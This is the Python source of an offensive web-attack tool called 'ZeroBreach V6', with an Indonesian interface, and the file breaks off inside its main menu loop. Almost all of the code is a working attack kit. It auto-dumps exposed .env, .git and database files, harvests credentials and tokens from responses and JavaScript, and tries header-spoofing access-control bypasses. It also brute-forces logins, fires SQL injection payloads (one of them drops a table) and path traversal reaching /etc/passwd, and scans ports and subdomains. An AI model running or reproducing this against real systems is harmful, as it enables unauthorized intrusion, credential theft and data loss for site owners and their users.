#!/usr/bin/env python3
"""
ZeroBreach V6 — full arsenal.
Auto-chain, auto-dump, sensitive detect, SQLi, brute, JS mining, subdomain enum.
"""

import base64
import hashlib
import json
import os
import random
import re
import socket
import string
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, quote

import requests
import urllib3
from colorama import Fore, Style, init

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)


G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
C = Fore.CYAN
W = Fore.WHITE
M = Fore.MAGENTA
B = Fore.BLUE
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT


BANNER = f"""{M}{BOLD}
  ______  ______  ______  ______  ______  ______  ______  ______
 |  __  ||  __  ||  __  ||  __  ||  __  ||  __  ||  __  ||  __  |
 | |  | || |  | || |  | || |  | || |  | || |  | || |  | || |  | |
 | |__| || |__| || |__| || |__| || |__| || |__| || |__| || |__| |
 |______||______||______||______||______||______||______||______|
{RESET}{C}
              >> ZEROBREACH V6 <<
         full arsenal · auto chain · auto dump
{RESET}"""


MENU = f"""
{C}{BOLD}╔══════════════════════════════════════════════════════════╗
║                    ZEROBREACH V6                         ║
║              full arsenal — no gimmick                   ║
╚══════════════════════════════════════════════════════════╝{RESET}

{Y}[ TARGET MODE ]{RESET}
  {G}[1]{RESET}  Auto Chain          — hit endpoint, chain 30+ turunan
  {G}[2]{RESET}  Full Attack         — semua modul auto
  {G}[3]{RESET}  Deep Recon          — fingerprint + enum 50+ path
  {G}[4]{RESET}  Leak Check          — file sensitif (.env, .git, sql)
  {G}[5]{RESET}  Bypass Attack       — 9 header × 10 endpoint admin
  {G}[6]{RESET}  Brute Force         — login brute (users × wordlist)
  {G}[7]{RESET}  JS Mining           — credential + endpoint di JS
  {G}[8]{RESET}  SQLi Probe          — 9 payload + time-based
  {G}[9]{RESET}  Path Traversal      — 5 payload /etc/passwd
  {G}[10]{RESET} Subdomain Enum      — cari subdomain via DNS
  {G}[11]{RESET} Port Scan           — 12 port umum
  {G}[12]{RESET} Directory Bruteforce— cari path tersembunyi
  {G}[13]{RESET} CORS Scan           — cek misconfig CORS
  {G}[14]{RESET} Header Analysis     — cek security header
  {G}[15]{RESET} GraphQL Probe       — cek introspection
  {G}[0]{RESET}  Keluar
"""


SENSITIVE_KEYS = [
    "email", "username", "password", "passwd", "hash",
    "token", "api_key", "apikey", "secret", "private_key",
    "access_token", "session", "cookie", "jwt", "bearer",
    "phone", "address", "credit_card", "ssn", "nik", "ktp",
    "role", "admin", "root", "superuser", "2fa", "otp",
    "signature", "csrf", "secret_key", "aws_access",
]


def clear():
    os.system("clear" if os.name != "nt" else "cls")


def pause():
    input(f"\n{C}[?]{RESET} ENTER buat lanjut...")


def log(kind, msg):
    tag = {
        "info":   f"{C}[*]{RESET}",
        "ok":     f"{G}[+]{RESET}",
        "warn":   f"{Y}[!]{RESET}",
        "err":    f"{R}[-]{RESET}",
        "crit":   f"{M}[X]{RESET}",
        "dump":   f"{G}{BOLD}[DUMP]{RESET}",
        "chain":  f"{C}{BOLD}[CHAIN]{RESET}",
        "sensi":  f"{M}{BOLD}[SENSITIVE]{RESET}",
        "sqli":   f"{R}{BOLD}[SQLI]{RESET}",
        "bypass": f"{M}{BOLD}[BYPASS]{RESET}",
        "hit":    f"{G}{BOLD}[HIT]{RESET}",
    }[kind]
    print(f"{tag} {msg}")


def safe_name(s):
    return re.sub(r"[^a-zA-Z0-9._-]", "_", s)[:120]


def rnd_str(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def looks_like_data(text):
    t = text.strip()
    tl = t.lower()
    if not t or len(t) < 20:
        return False
    if t.startswith(("{", "[")):
        try:
            json.loads(t)
            return True
        except Exception:
            return False
    if re.search(r"^[A-Z_]{3,}\s*=\s*\S", text, re.M):
        return True
    if re.search(r"\[\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}", text):
        return True
    if re.search(r"(DB_PASSWORD|DB_USER|APP_KEY|SECRET_KEY|API_KEY)\s*=", text):
        return True
    if re.search(r"(INSERT INTO|CREATE TABLE|DROP TABLE)", text, re.I):
        return True
    if "[core]" in text and "repositoryformatversion" in text:
        return True
    if "<!doctype html" in tl or "<html" in tl:
        return False
    return False


def get_kind(text):
    t = text.strip()
    if t.startswith(("{", "[")):
        return "json"
    if re.search(r"^[A-Z_]{3,}\s*=\s*\S", text, re.M):
        return "env"
    if re.search(r"\[\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}", text):
        return "log"
    if re.search(r"(INSERT INTO|CREATE TABLE)", text, re.I):
        return "sql"
    if "[core]" in text:
        return "gitconfig"
    return "txt"


def find_sensitive(body):
    found = []
    bl = body.lower()
    for k in SENSITIVE_KEYS:
        if k in bl:
            m = re.search(rf'"{re.escape(k)}"\s*:\s*"([^"]{{1,300}})"', body, re.I)
            if m:
                found.append((k, m.group(1)))
                continue
            m2 = re.search(rf'{re.escape(k)}\s*[:=]\s*(\S{{1,300}})', body, re.I)
            if m2:
                found.append((k, m2.group(1)[:300]))
    return found


def extract_ids(body):
    ids, emails, usernames = set(), set(), set()
    for m in re.finditer(r'"(?:id|user_id|server_id|account_id|node_id)"\s*:\s*(\d+)', body):
        ids.add(m.group(1))
    for m in re.finditer(r'"id"\s*:\s*"([a-f0-9-]{36})"', body):
        ids.add(m.group(1))
    for m in re.finditer(r'"email"\s*:\s*"([^"]+@[^"]+)"', body):
        emails.add(m.group(1))
    for m in re.finditer(r'"username"\s*:\s*"([^"]+)"', body):
        usernames.add(m.group(1))
    return list(ids)[:30], list(emails)[:30], list(usernames)[:30]


CHAIN_ENDPOINTS = [
    "/api/users/{id}", "/api/user/{id}",
    "/api/application/users/{id}",
    "/api/application/users/{id}/servers",
    "/api/users/{id}/servers", "/api/users/{id}/permissions",
    "/api/client/servers", "/api/client/account",
    "/api/client/permissions", "/api/servers/{id}",
    "/api/application/servers/{id}",
    "/api/application/nodes/{id}",
    "/api/config", "/api/settings",
    "/api/keys", "/api/tokens", "/api/api-keys",
    "/api/logs", "/api/activity", "/api/audit",
    "/api/admin", "/api/admin/users",
    "/api/v1/users", "/api/v2/users",
    "/api/v1/config", "/api/v1/admin",
    "/api/v1/keys", "/api/v1/logs",
    "/api/v1/me", "/api/v1/profile",
]


PATHS = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/api/users", "/api/admin", "/api/config", "/api/settings",
    "/api/keys", "/api/token", "/api/me", "/api/profile",
    "/api/users/count", "/api/servers", "/api/nodes",
    "/api/application/users", "/api/application/servers",
    "/api/application/nodes", "/api/application/locations",
    "/api/application/nests", "/api/client/account",
    "/api/logs", "/api/db", "/api/database", "/api/backup",
    "/api/export", "/api/import", "/api/search",
    "/.env", "/.env.local", "/.env.backup", "/.env.production",
    "/config.json", "/config.js", "/config.php", "/config.yaml",
    "/secrets.json", "/credentials.json", "/firebase.json",
    "/google-services.json", "/serviceAccount.json",
    "/.git/config", "/.git/HEAD", "/.gitignore",
    "/storage/logs/laravel.log", "/error.log", "/debug.log",
    "/phpinfo.php", "/info.php", "/test.php",
    "/db.sql", "/dump.sql", "/backup.sql", "/database.sql",
    "/backup.zip", "/backup.tar.gz",
    "/admin", "/admin/login", "/dashboard", "/phpmyadmin",
    "/pma", "/administrator", "/wp-admin",
    "/swagger.json", "/openapi.json", "/api-docs",
    "/graphql", "/graphiql",
    "/robots.txt", "/sitemap.xml", "/.htaccess", "/web.config",
]


ADMIN_ENDPOINTS = [
    "/api/application/users", "/api/application/servers",
    "/api/application/nodes", "/api/application/nests",
    "/api/admin/users", "/api/admin", "/api/v1/admin",
    "/api/users", "/api/config", "/api/keys",
]


BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Host": "localhost"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
]


LOGIN_PATHS = [
    "/api/login", "/api/auth/login", "/auth/login",
    "/login", "/admin/login", "/api/v1/login",
    "/api/v1/auth/login", "/users/login", "/api/signin",
]


SQLI_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "' OR 1=1--",
    "1' AND SLEEP(3)--", "1 UNION SELECT NULL--",
    "%27", "1;DROP TABLE users--",
    "' OR 'x'='x", "admin'--", "') OR ('1'='1",
]


TRAVERSAL = [
    "../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "..\\..\\etc\\passwd",
    "....\\....\\etc\\passwd",
]


DIR_WORDLIST = [
    "admin", "login", "dashboard", "api", "test", "dev",
    "backup", "config", "db", "sql", "old", "new",
    "private", "secret", "internal", "staging", "prod",
    "v1", "v2", "v3", "docs", "swagger", "graphql",
    "uploads", "files", "assets", "static", "tmp",
    "user", "users", "account", "profile", "settings",
]


class ZeroBreach:
    def __init__(self, target, timeout=8, threads=10, outdir="loot",
                 users_file="users.txt", wordlist_file="wordlist.txt"):
        self.target = target.rstrip("/")
        if not self.target.startswith(("http://", "https://")):
            self.target = "http://" + self.target
        self.timeout = timeout
        self.threads = threads
        self.outdir = outdir
        os.makedirs(self.outdir, exist_ok=True)

        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
        })

        self.hits = []
        self.loot = []
        self.sensitive = []
        self.visited = set()
        self.users = self._load(users_file)
        self.wordlist = self._load(wordlist_file)
        self.found_creds = None

    def _load(self, path):
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return [l.strip() for l in f if l.strip() and not l.startswith("#")]
        except FileNotFoundError:
            return []

    def _req(self, method, path, headers=None, data=None, json_data=None,
             allow_redirects=True, timeout=None):
        url = path if path.startswith("http") else self.target + path
        key = f"{method}:{url}"
        if key in self.visited:
            return None
        self.visited.add(key)
        try:
            return self.session.request(
                method=method, url=url, headers=headers,
                data=data, json=json_data,
                timeout=timeout or self.timeout, verify=False,
                allow_redirects=allow_redirects,
            )
        except Exception:
            return None

    def get(self, p, **kw): return self._req("GET", p, **kw)
    def post(self, p, **kw): return self._req("POST", p, **kw)

    def _record(self, sev, name, detail):
        self.hits.append((sev, name, detail))
        icon = {
            "crit": f"{M}[CRIT]{RESET}",
            "high": f"{R}[HIGH]{RESET}",
            "med":  f"{Y}[MED]{RESET}",
            "info": f"{C}[INFO]{RESET}",
        }[sev]
        print(f"{icon} {name}")
        print(f"        {W}{detail}{RESET}")

    def _save(self, name, body):
        kind = get_kind(body)
        fname = f"{safe_name(name)}.{kind}"
        fpath = os.path.join(self.outdir, fname)
        try:
            with open(fpath, "w", encoding="utf-8", errors="ignore") as f:
                f.write(body)
        except Exception:
            return None
        return fpath

    def _auto_dump(self, label, r):
        body = r.text
        if not looks_like_data(body):
            return False
        saved = self._save(label, body)
        if not saved:
            return False
        kind = get_kind(body)
        size = len(body)
        log("dump", f"{label} [{kind}] {size}B -> {saved}")
        self.loot.append((label, kind, size, saved))

        sens = find_sensitive(body)
        if sens:
            log("sensi", f"DATA PENTING di {label}:")
            for k, v in sens[:15]:
                print(f"        {M}{k}{RESET} = {W}{v[:120]}{RESET}")
                self.sensitive.append((label, k, v))
            self._record("crit", f"Data sensitif: {label}",
                         f"{len(sens)} field sensitif")
        return True

    # ============================================================
    # AUTO CHAIN
    # ============================================================
    def auto_chain(self):
        print(f"\n{C}=== AUTO CHAIN ==={RESET}")
        print(f"{C}Target: {W}{self.target}{RESET}\n")

        r = self.get(self.target, allow_redirects=False)
        if not r:
            log("err", "Endpoint nggak respon.")
            return

        log("info", f"Status: HTTP {r.status_code} | {len(r.text)}B")
        self._auto_dump("main", r)

        ids, emails, usernames = extract_ids(r.text)
        if ids or emails or usernames:
            log("ok", f"Extracted: {len(ids)} ID, {len(emails)} email, "
                      f"{len(usernames)} username")

        print(f"\n{C}=== CHAINING ==={RESET}")
        base = self.target.split("/api/")[0]
        if "/api/" in self.target:
            base = self.target.split("/api/")[0] + "/api"

        chain_urls = set()
        for i in ids[:15]:
            for ep in CHAIN_ENDPOINTS:
                if "{id}" in ep:
                    chain_urls.add(base + ep.replace("{id}", str(i)))
        for ep in CHAIN_ENDPOINTS:
            if "{id}" not in ep:
                chain_urls.add(base + ep)
        for e in emails[:10]:
            chain_urls.add(f"{base}/users?email={e}")
            chain_urls.add(f"{base}/user?email={e}")

        log("info", f"Chain: {len(chain_urls)} URL")

        def _check(url):
            return url, self.get(url, allow_redirects=False)

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = [ex.submit(_check, u) for u in chain_urls]
            for f in as_completed(futs):
                res = f.result()
                if not res:
                    continue
                url, rr = res
                if not rr:
                    continue
                if rr.status_code == 200:
                    label = "chain_" + safe_name(url.replace(base, ""))
                    if self._auto_dump(label, rr):
                        log("chain", f"OK: {url}")
                    else:
                        new_ids, new_emails, _ = extract_ids(rr.text)
                        if new_ids or new_emails:
                            log("chain", f"IDs: {url} -> "
                                         f"{len(new_ids)} ID, {len(new_emails)} email")

        print(f"\n{C}=== BYPASS ATTEMPT ==={RESET}")
        for au in ADMIN_ENDPOINTS[:6]:
            url = base + au.replace("/api", "") if au.startswith("/api") else base + au
            for h in BYPASS_HEADERS:
                rr = self._req("GET", url, headers=h, allow_redirects=False)
                if rr and rr.status_code == 200 and looks_like_data(rr.text):
                    log("bypass", f"{url} via {list(h.keys())[0]}")
                    self._auto_dump(f"bypass_{safe_name(au)}", rr)
                    break

        print(f"\n{C}=== LOGIN PROBE ==={RESET}")
        base_no_api = self.target.split("/api/")[0]
        for lp in LOGIN_PATHS:
            url = base_no_api + lp
            rr = self.post(url, json_data={}, allow_redirects=False)
            if rr and rr.status_code not in (404,):
                log("info", f"{url} -> HTTP {rr.status_code}")

        if self.users and self.wordlist:
            print(f"\n{C}=== BRUTE ATTEMPT ==={RESET}")
            for lp in LOGIN_PATHS:
                url = base_no_api + lp
                rr = self.post(url, json_data={})
                if not rr or rr.status_code == 404:
                    continue
                log("info", f"Brute: {url}")
                with ThreadPoolExecutor(max_workers=3) as ex:
                    futs = {}
                    for u in self.users:
                        for p in self.wordlist:
                            futs[ex.submit(self._try_login, url, u, p)] = (u, p)
                    for f in as_completed(futs):
                        res = f.result()
                        if res:
                            log("hit", f"LOGIN: {url} | {res[0]}:{res[1]}")
                            self.found_creds = (url, res[0], res[1])
                            for ff in futs:
                                ff.cancel()
                            return

    def _try_login(self, path, user, pw):
        for key_u, key_p in [("email", "password"), ("username", "password"),
                             ("user", "pass")]:
            try:
                r = self.post(
                    path,
                    json_data={key_u: user, key_p: pw},
                    headers={"Content-Type": "application/json"},
                    allow_redirects=False,
                )
                if r and r.status_code in (200, 201, 302):
                    body = r.text.lower()
                    if any(k in body for k in ("token", "success", "welcome", "dashboard")):
                        return (user, pw, r.text[:1000])
            except Exception:
                pass
        return None

    # ============================================================
    # DEEP RECON
    # ============================================================
    def deep_recon(self):
        print(f"\n{C}=== DEEP RECON ==={RESET}")
        r = self.get("/")
        if r:
            log("ok", f"Target hidup: HTTP {r.status_code}")
            log("info", f"Server: {r.headers.get('Server', '?')}")
            log("info", f"X-Powered-By: {r.headers.get('X-Powered-By', '?')}")
            body = r.text.lower()
            tech = []
            for kw, name in [("laravel", "Laravel"), ("_next", "Next.js"),
                             ("react", "React"), ("vue", "Vue"),
                             ("pterodactyl", "Pterodactyl"),
                             ("wordpress", "WordPress"), ("django", "Django"),
                             ("cloudflare", "Cloudflare")]:
                if kw in body:
                    tech.append(name)
            if tech:
                log("ok", f"Tech: {', '.join(set(tech))}")

        baseline_r = self.get(f"/{rnd_str(16)}", allow_redirects=False)
        baseline_len = len(baseline_r.text) if baseline_r else 0
        if baseline_len > 100:
            log("info", f"Baseline SPA: {baseline_len}B (false-positive filter ON)")

        log("info", f"Enum {len(PATHS)} path...")

        def _check(p):
            return p, self.get(p, allow_redirects=False)

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = [ex.submit(_check, p) for p in PATHS]
            for f in as_completed(futs):
                res = f.result()
                if not res:
                    continue
                p, rr = res
                if not rr:
                    continue
                if rr.status_code == 200:
                    if baseline_len and abs(len(rr.text) - baseline_len) < 50:
                        if rr.text[:100] == baseline_r.text[:100]:
                            continue
                    self._auto_dump(p, rr)
                elif rr.status_code == 401:
                    self._record("med", f"Butuh auth: {p}", "HTTP 401")
                elif rr.status_code == 500:
                    self._record("high", f"Error 500: {p}", "potensi leak")
                    if looks_like_data(rr.text):
                        self._auto_dump(f"err{p}", rr)

    # ============================================================
    # LEAK CHECK
    # ============================================================
    def leak_check(self):
        print(f"\n{C}=== LEAK CHECK ==={RESET}")
        leaks = [
            "/.env", "/.env.local", "/.env.backup", "/.env.production",
            "/config.json", "/config.js", "/config.php", "/config.yaml",
            "/secrets.json", "/credentials.json",
            "/.git/config", "/.git/HEAD",
            "/storage/logs/laravel.log", "/error.log",
            "/db.sql", "/dump.sql", "/backup.sql",
            "/backup.zip", "/backup.tar.gz",
            "/phpinfo.php", "/info.php",
        ]
        for p in leaks:
            r = self.get(p, allow_redirects=False)
            if r and r.status_code == 200 and looks_like_data(r.text):
                self._auto_dump(p, r)

    # ============================================================
    # BYPASS ATTACK
    # ============================================================
    def bypass_attack(self):
        print(f"\n{C}=== BYPASS ATTACK ==={RESET}")
        for ep in ADMIN_ENDPOINTS:
            base_r = self.get(ep, allow_redirects=False)
            # kalau baseline udah 200, skip (false positive)
            if base_r and base_r.status_code == 200 and looks_like_data(base_r.text):
                continue
            for h in BYPASS_HEADERS:
                r = self.get(ep, headers=h, allow_redirects=False)
                if r and r.status_code == 200 and looks_like_data(r.text):
                    log("bypass", f"{ep} via {list(h.keys())[0]}")
                    self._auto_dump(f"bypass_{safe_name(ep)}", r)
                    break

    # ============================================================
    # BRUTE FORCE
    # ============================================================
    def brute_only(self):
        print(f"\n{C}=== BRUTE FORCE ==={RESET}")
        if not self.users or not self.wordlist:
            log("warn", "users.txt / wordlist.txt kosong.")
            return
        log("info", f"Users: {len(self.users)} | Passwords: {len(self.wordlist)}")
        base = self.target.split("/api/")[0]
        for lp in LOGIN_PATHS:
            url = base + lp
            rr = self.post(url, json_data={})
            if not rr or rr.status_code == 404:
                continue
            log("info", f"Coba: {url}")
            with ThreadPoolExecutor(max_workers=3) as ex:
                futs = {}
                for u in self.users:
                    for p in self.wordlist:
                        futs[ex.submit(self._try_login, url, u, p)] = (u, p)
                for f in as_completed(futs):
                    res = f.result()
                    if res:
                        log("hit", f"LOGIN: {url} | {res[0]}:{res[1]}")
                        self.found_creds = (url, res[0], res[1])
                        for ff in futs:
                            ff.cancel()
                        return

    # ============================================================
    # JS MINING
    # ============================================================
    def js_mining(self):
        print(f"\n{C}=== JS MINING ==={RESET}")
        r = self.get("/")
        if not r:
            return
        js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', r.text)
        js_urls = [urljoin(self.target, u) for u in js_urls][:20]
        log("info", f"JS files: {len(js_urls)}")

        cred_re = re.compile(
            r'(api[_-]?key|apikey|secret|token|bearer|auth|password|private[_-]?key)'
            r'["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
            re.I,
        )
        ep_re = re.compile(r'["\'](/api/[a-zA-Z0-9/_-]{2,})["\']')

        for js in js_urls:
            jr = self.get(js)
            if not jr or jr.status_code != 200:
                continue
            for m in cred_re.finditer(jr.text):
                k, v = m.group(1), m.group(2)
                if v.lower() in ("undefined", "null", "none", ""):
                    continue
                log("crit", f"Cred: {k}={v[:60]}")
                self._record("crit", "Credential di JS", f"{k}={v[:60]}")
                self.sensitive.append((js, k, v))
                self._save(f"cred_{k}", f"{k}={v}")

            eps = list(set(ep_re.findall(jr.text)))[:30]
            log("info", f"Endpoint di JS: {len(eps)}")
            for ep in eps:
                self._record("info", "Endpoint di JS", ep)
                er = self.get(ep)
                if er and er.status_code == 200 and looks_like_data(er.text):
                    self._auto_dump(f"js{safe_name(ep)}", er)

    # ============================================================
    # SQLi PROBE
    # ============================================================
    def sqli_probe(self):
        print(f"\n{C}=== SQLi PROBE ==={RESET}")
        base = self.target.split("?")[0].rstrip("/")
        for pl in SQLI_PAYLOADS:
            url = f"{base}?id={quote(pl)}"
            start = time.time()
            r = self._req("GET", url, allow_redirects=False, timeout=10)
            elapsed = time.time() - start
            if not r:
                continue
            if r.status_code == 500:
                log("sqli", f"500 di {pl[:30]}")
                self._record("high", f"SQLi suspect: {pl[:30]}", "HTTP 500")
            if elapsed > 2.5:
                log("sqli", f"Delay {elapsed:.1f}s di {pl[:30]}")
                self._record("crit", f"Time-based SQLi: {pl[:30]}", f"delay {elapsed:.1f}s")
            if re.search(r"(sql syntax|mysql_|ORA-|PostgreSQL|SQLite)", r.text, re.I):
                log("sqli", f"SQL error di {pl[:30]}")
                self._record("crit", f"SQL error: {pl[:30]}", "error leak")
                self._auto_dump(f"sqli_{safe_name(pl)}", r)

    # ============================================================
    # PATH TRAVERSAL
    # ============================================================
    def path_traversal(self):
        print(f"\n{C}=== PATH TRAVERSAL ==={RESET}")
        base = self.target.split("?")[0].rstrip("/")
        for tr in TRAVERSAL:
            for param in ["file", "path", "page", "include", "doc", "template"]:
                url = f"{base}?{param}={tr}"
                r = self._req("GET", url, allow_redirects=False)
                if r and "root:x:" in r.text:
                    log("crit", f"Traversal: {param}={tr}")
                    self._auto_dump(f"traversal_{param}", r)

    # ============================================================
    # SUBDOMAIN ENUM
    # ============================================================
    def subdomain_enum(self):
        print(f"\n{C}=== SUBDOMAIN ENUM ==={RESET}")
        parsed = urlparse(self.target)
        host = parsed.hostname
        if not host:
            return
        parts = host.split(".")
        if len(parts) < 2:
            log("warn", "Domain terlalu pendek.")
            return
        root = ".".join(parts[-2:])
        subs = ["www", "api", "admin", "dev", "staging", "test",
                "mail", "ftp", "ssh", "vpn", "panel", "cp",
                "cpanel", "whm", "webmail", "portal", "app",
                "beta", "demo", "internal", "intranet"]
        log("info", f"Root: {root} | Sub: {len(subs)}")

        def _check(s):
            full = f"{s}.{root}"
            try:
                ip = socket.gethostbyname(full)
                return full, ip
            except Exception:
                return None

        with ThreadPoolExecutor(max_workers=15) as ex:
            futs = [ex.submit(_check, s) for s in subs]
            for f in as_completed(futs):
                res = f.result()
                if res:
                    name, ip = res
                    self._record("med", f"Subdomain: {name}", ip)

    # ============================================================
    # PORT SCAN
    # ============================================================
    def port_scan(self):
        print(f"\n{C}=== PORT SCAN ==={RESET}")
        host = urlparse(self.target).hostname
        if not host:
            return
        ports = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
                 53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
                 443: "HTTPS", 3306: "MySQL", 5432: "PostgreSQL",
                 6379: "Redis", 8080: "Alt HTTP", 8443: "Alt HTTPS",
                 9200: "Elasticsearch", 27017: "MongoDB"}
        for port, name in ports.items():
            try:
                s = socket.create_connection((host, port), timeout=3)
                s.close()
                sev = "info" if port in (80, 443) else "high"
                self._record(sev, f"Port: {port}", name)
            except Exception:
                pass

    # ============================================================
    # DIRECTORY BRUTEFORCE
    # ============================================================
    def dir_bruteforce(self):
        print(f"\n{C}=== DIRECTORY BRUTEFORCE ==={RESET}")
        base = self.target.split("/api/")[0] if "/api/" in self.target else self.target
        baseline_r = self.get(f"/{rnd_str(16)}", allow_redirects=False)
        baseline_len = len(baseline_r.text) if baseline_r else 0

        def _check(d):
            return d, self.get(f"/{d}", allow_redirects=False)

        log("info", f"Cek {len(DIR_WORDLIST)} directory...")
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = [ex.submit(_check, d) for d in DIR_WORDLIST]
            for f in as_completed(futs):
                res = f.result()
                if not res:
                    continue
                d, r = res
                if not r:
                    continue
                if r.status_code == 200:
                    if baseline_len and abs(len(r.text) - baseline_len) < 50:
                        continue
                    self._record("med", f"Dir: /{d}", f"HTTP 200 | {len(r.text)}B")
                    if looks_like_data(r.text):
                        self._auto_dump(f"dir_{d}", r)
                elif r.status_code == 403:
                    self._record("info", f"Dir: /{d}", "403 (ada tapi blocked)")
                elif r.status_code == 401:
                    self._record("med", f"Dir: /{d}", "401 (butuh auth)")

    # ============================================================
    # CORS SCAN
    # ============================================================
    def cors_scan(self):
        print(f"\n{C}=== CORS SCAN ==={RESET}")
        r = self.get("/", headers={"Origin": "https://evil.com"})
        if not r:
            return
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        acam = r.headers.get("Access-Control-Allow-Methods", "")
        if acao == "*":
            self._record("med", "CORS wildcard", f"ACAO: *")
        elif "evil.com" in acao:
            self._record("high", "CORS reflects origin", f"ACAO: {acao}")
        if acao and acac.lower() == "true":
            self._record("crit", "CORS + credentials", "kombinasi bahaya")
        if acam:
            self._record("info", "CORS methods", acam)

    # ============================================================
    # HEADER ANALYSIS
    # ============================================================
    def header_analysis(self):
        print(f"\n{C}=== HEADER ANALYSIS ==={RESET}")
        r = self.get("/")
        if not r:
            return
        sec_headers = {
            "Strict-Transport-Security": "HSTS",
            "Content-Security-Policy": "CSP",
            "X-Frame-Options": "X-Frame-Options",
            "X-Content-Type-Options": "X-Content-Type",
            "Referrer-Policy": "Referrer-Policy",
            "Permissions-Policy": "Permissions-Policy",
        }
        for h, name in sec_headers.items():
            if h in r.headers:
                self._record("info", f"[✓] {name}", r.headers[h][:80])
            else:
                self._record("med", f"[✗] {name}", "MISSING")

    # ============================================================
    # GRAPHQL PROBE
    # ============================================================
    def graphql_probe(self):
        print(f"\n{C}=== GRAPHQL PROBE ==={RESET}")
        endpoints = ["/graphql", "/api/graphql", "/v1/graphql", "/query"]
        introspection = {"query": "{__schema{types{name fields{name}}}}"}
        for ep in endpoints:
            r = self.post(ep, json_data=introspection)
            if r and r.status_code == 200 and "__schema" in r.text:
                log("crit", f"GraphQL introspection AKTIF: {ep}")
                self._record("crit", "GraphQL introspection", ep)
                self._auto_dump(f"graphql{safe_name(ep)}", r)

    # ============================================================
    # FULL ATTACK
    # ============================================================
    def full_attack(self):
        self.deep_recon()
        self.leak_check()
        self.bypass_attack()
        self.js_mining()
        self.sqli_probe()
        self.path_traversal()
        self.brute_only()
        self.subdomain_enum()
        self.dir_bruteforce()
        self.cors_scan()
        self.header_analysis()
        self.graphql_probe()
        self.port_scan()

    # ============================================================
    # REPORT
    # ============================================================
    def report(self):
        print()
        print(f"{C}{'=' * 62}{RESET}")
        print(f"{C}{BOLD}  REPORT — {self.target}{RESET}")
        print(f"{C}{'=' * 62}{RESET}")

        counts = {"crit": 0, "high": 0, "med": 0, "info": 0}
        for s, _, _ in self.hits:
            counts[s] = counts.get(s, 0) + 1

        print(f"  {M}CRIT: {counts['crit']}{RESET}  "
              f"{R}HIGH: {counts['high']}{RESET}  "
              f"{Y}MED: {counts['med']}{RESET}  "
              f"{C}INFO: {counts['info']}{RESET}")
        print(f"  {G}Files dumped: {len(self.loot)}{RESET}")
        print(f"  {M}Data sensitif: {len(self.sensitive)}{RESET}\n")

        if self.sensitive:
            print(f"{M}{BOLD}  ═══ DATA PENTING ═══{RESET}")
            for label, k, v in self.sensitive[:30]:
                print(f"  {M}●{RESET} {label}")
                print(f"    {W}{k}{RESET} = {v[:120]}")
            print()

        order = {"crit": 0, "high": 1, "med": 2, "info": 3}
        for sev, name, detail in sorted(self.hits, key=lambda x: order[x[0]]):
            icon = {
                "crit": f"{M}[CRIT]{RESET}",
                "high": f"{R}[HIGH]{RESET}",
                "med":  f"{Y}[MED]{RESET}",
                "info": f"{C}[INFO]{RESET}",
            }[sev]
            print(f"{icon} {name}")
            print(f"        {W}{detail}{RESET}")

        print()
        print(f"{G}[+] Loot: {self.outdir}/")

        try:
            with open("zerobreach_report.json", "w") as f:
                json.dump({
                    "target": self.target,
                    "creds_found": self.found_creds,
                    "hits": self.hits,
                    "sensitive": [{"source": l, "key": k, "value": v}
                                  for l, k, v in self.sensitive],
                    "loot": [{"label": l, "kind": k, "size": s, "file": fp}
                             for l, k, s, fp in self.loot],
                }, f, indent=2)
            print(f"{G}[+] Report: zerobreach_report.json{RESET}")
        except Exception:
            pass


# ============================================================
# MAIN
# ============================================================
def get_target():
    t = input(f"{C}[?]{RESET} URL target: ").strip()
    if not t:
        log("err", "URL kosong.")
        return None
    return t


def main():
    clear()
    print(BANNER)
    while True:
        print(MENU)
        pilihan = input(f"{C}[?]{RESET} Pilih: ").strip()

        if pilihan == "0":
            print(f"\n{Y}[!] Keluar. 6767.{RESET}")
            sys.exit(0)

        if pilihan not in [str(i) for i in range(1, 16)]:
            clear()
            print(BANNER)
            log("err", "Pilihan nggak valid.")
            time.sleep(1)
            clear()
            print(BANNER)
            continue

        target = get_target()
        if not target:
            time.sleep(1)
            clear()
            print(BANNER)
            continue

        outdir = input(f"{C}[?]{RESET} Outdir (default loot): ").strip() or "loot"
        threads_in = input(f"{C}[?]{RESET} Threads (default 10): ").strip() or "10"
        try:
            threads = int(threads_in)
        except ValueError:
            threads = 10

        clear()
        print(f"{G}{BOLD}=== ZeroBreach V6 ==={RESET}")
        print(f"{C}Target : {W}{target}{RESET}")
        print(f"{C}Outdir : {W}{outdir}{RESET}")
        print(f"{C}Threads: {W}{threads}{RESET}\n")

        tool = ZeroBreach(target, threads=threads, outdir=outdir)

        try:
            if pilihan == "1":
                tool.auto_chain()
            elif pilihan == "2":
